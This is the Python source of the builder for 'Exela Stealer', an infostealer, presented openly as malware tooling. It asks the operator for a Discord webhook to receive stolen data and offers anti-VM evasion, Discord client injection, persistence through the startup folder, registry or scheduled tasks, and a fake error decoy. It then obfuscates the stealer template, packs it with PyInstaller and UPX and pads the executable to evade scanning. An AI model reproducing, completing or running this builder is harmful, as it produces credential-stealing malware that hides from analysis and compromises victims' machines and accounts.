import os, ctypes, shutil, sys, time
from pkg_resources import parse_version

try:
    ctypes.windll.kernel32.SetConsoleTitleW(
        f"Exela Stealer | Builder | {os.getenv('computername')}"
    )
except:
    pass
try:
    os.system("color d & cls")
except:
    pass


class Build:
    def __init__(self) -> None:
        self.webhook = None
        self.Anti_VM = bool()
        self.startup = bool()
        self.StartupMethod = None
        self.injection = bool()
        self.fakeError = bool()
        self.current_path = os.getcwd()
        self.pump = bool()
        self.pumSize = int()  # mb
        self.PyInstallerCommand = 'pyinstaller --onefile --noconsole --noconfirm --upx-dir UPX --version-file AssemblyFile\\version.txt'

    def CallFuncions(self) -> None:
        try:
            self.InstallModules()
            os.system("cls")
            self.GetWebhook()
            self.GetAntiVm()
            self.GetDiscordInjection()
            self.GetStartupMethod()
            self.GetFakeError()
            self.GetIcon()
            self.PumpFile()
            self.WriteSettings()
            os.system("cls")
            self.ObfuscateFile("Stub.py")
            self.build_file()
            shutil.copy("dist\\stub.exe", "stub.exe")
            if self.pump == True:
                self.expand_file("stub.exe", self.pumSize)
            try:
                # delete Junk Files & Directorys
                shutil.rmtree("dist")
                shutil.rmtree("build")
                os.remove("stub.py")
                os.remove("stub.spec")
            except:
                pass
            if os.path.exists("stub.exe"):
                os.rename("stub.exe", "Exela.exe")
            print("\nfile compiled, close the window")
        except Exception as e:
            ctypes.windll.user32.MessageBoxW(
                0,
                f"An error occurred while building your file. error code\n\n{str(e)}",
                "Error",
                0x10,
            )
        else:
            ctypes.windll.user32.MessageBoxW(
                0,
                "Your file compiled succesfully, now u can close the window.",
                "Information",
                0x40,
            )
            while True:
                continue

    def PumpFile(self) -> None:
        pump_q = str(
            input("Yes/No (Default size 10 or 11 mb)\nDo u want to pump the file : ")
        )
        if pump_q.lower() == "y" or pump_q.lower() == "yes":
            pump_size = int(input("how much mb size u want to pumps : "))
            self.pump = True
            self.pumSize = pump_size
        else:
            self.pump = False

    def expand_file(self, file_name, additional_size_mb) -> None:
        if os.path.exists(file_name):
            additional_size_bytes = additional_size_mb * 1024 * 1024

            with open(file_name, "ab") as file:
                current_size = file.tell()
                target_size = current_size + additional_size_bytes

                empty_bytes = bytearray([0x00] * additional_size_bytes)
                file.write(empty_bytes)

                print(
                    f'{additional_size_mb} MB added to "{os.path.join(self.current_path, file_name)}"'
                )

    def build_file(self) -> None:
        os.system(self.PyInstallerCommand)

    def InstallModules(self) -> None:
        os.system("pip install cryptography")
        os.system("pip install aiohttp")
        os.system("pip install pyinstaller")

    def WriteSettings(self) -> None:
        with open("Exela.py", "r", encoding="utf-8", errors="ignore") as file:
            data = file.read()
        replaced_data = (
            data.replace("%WEBHOOK%", str(self.webhook))
            .replace('"%Anti_VM%"', str(self.Anti_VM))
            .replace('"%injection%"', str(self.injection))
            .replace("%startup_method%", str(self.StartupMethod))
            .replace('"%fake_error%"', str(self.fakeError))
        )
        with open("Stub.py", "w", encoding="utf-8", errors="ignore") as laquica:
            laquica.write(replaced_data)

    def ObfuscateFile(self, input_file) -> None:
        obf_file = os.path.join(self.current_path, "Obfuscator", "obf.py")
        os.system(f'python "{obf_file}" "{input_file}" stub.py')

    def GetIcon(self) -> None:
        get_icon = str(input("Yes/No\nDo u want to change the icon of the file : "))
        if get_icon.lower() == "yes" or get_icon.lower() == "y":
            get_icon_path = str(
                input(
                    "icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "
                )
            )
            if not get_icon_path.endswith(".ico"):
                print("pls use .ico file, now icon change has been disabled")
                self.PyInstallerCommand += " stub.py"
            else:
                if not os.path.isfile(get_icon_path):
                    print("file does not exist, icon change has been disabled.")
                    self.PyInstallerCommand += " stub.py"
                else:
                    if self.CheckIcoFile(get_icon_path):
                        self.PyInstallerCommand += (
                            f" --icon={get_icon_path} stub.py"
                        )
                    else:
                        print(
                            "Your file doesnt current a ico file, icon change has been disabled"
                        )
                        self.PyInstallerCommand += " stub.py"
        else:
            self.PyInstallerCommand += " stub.py"

    def CheckIcoFile(self, file_path: str) -> bool:
        try:
            ico_header = b"\x00\x00\x01\x00"  # ico header

            with open(file_path, "rb") as file:
                header_data = file.read(4)

            return header_data == ico_header
        except:
            return False

    def GetFakeError(self) -> None:
        try:
            er = str(input("Yes/No\nDo u want to use fake Error : "))
            if er.lower() == "yes" or er.lower() == "y":
                self.fakeError = True
            else:
                self.fakeError = False
        except:
            pass

    def GetWebhook(self) -> None:
        web = str(input("Enter your webhook URL : "))
        if not "/api/webhooks/" in web:
            print("invalid webhook URL")
            while True:
                continue
        if not web.startswith("https://"):
            print("use with https URL not http")
            while True:
                continue
        else:
            self.webhook = web

    def GetAntiVm(self) -> None:
        getAntiVmReq = str(input("Yes/No\nDo u want enable Anti-VM : "))
        if getAntiVmReq.lower() == "y" or getAntiVmReq.lower() == "yes":
            self.Anti_VM = True
        else:
            self.Anti_VM = False

    def GetStartupMethod(self) -> None:
        getStartupReq = str(input("Yes/no\nDo you want to use Startup : "))
        if getStartupReq.lower() == "y" or getStartupReq.lower() == "yes":
            self.startup = True
            print(
                "--------------------------------------------\n1-)Folder Startup (This method use windows startup folder's for startup) \n2-)HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n3-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n4-)Disable Startup\n--------------------------------------------\n\n"
            )
            getStartupMethod = input("1/2/3/4\nEnter your selection: ")
            if getStartupMethod == "1":
                self.StartupMethod = "folder"
            elif getStartupMethod == "2":
                self.StartupMethod = "regedit"
            elif getStartupMethod == "3":
                self.StartupMethod = "schtasks"
            elif getStartupMethod == "4":
                self.StartupMethod == "no-startup"
            else:
                print("unkown Startup method, startup has been disabled.")
                self.startup = False
                self.StartupMethod = "no-startup"
        else:
            self.startup = False
            self.StartupMethod == "no-startup"

    def GetDiscordInjection(self) -> None:
        inj = str(input("Yes/No\nDo u want to enabled Discord injection : "))
        if inj.lower() == "y" or inj.lower() == "yes":
            self.injection == True
        else:
            self.injection = False


if __name__ == "__main__":
    if os.name == "nt":
        version = ".".join(
            [
                str(x)
                for x in (
                    sys.version_info.major,
                    sys.version_info.minor,
                    sys.version_info.micro,
                )
            ]
        )
        if parse_version(version) < parse_version("3.9"):
            ctypes.windll.user32.MessageBoxW(
                0,
                f"{str(version)} un supported by Exela, pls upgrade 3.9 or 3.11",
                "Error",
                0x10,
            )
        elif parse_version(version) > parse_version("3.11"):
            ctypes.windll.user32.MessageBoxW(
                0,
                f"{str(version)} un supported by Exela, pls downgrade 3.11 or 3.10 or 3.9",
                "Error",
                0x10,
            )
        elif (
            parse_version(version) == parse_version("3.11")
            or parse_version(version) == parse_version("3.10")
            or parse_version(version) == parse_version("3.9")
        ):
            Build().CallFuncions()
        else:
            ctypes.windll.user32.MessageBoxW(
                0,
                f"{str(version)} un supported by Exela, pls use 3.11.0",
                "Error",
                0x10,
            )
    else:
        print("just windows operating systems supported!")
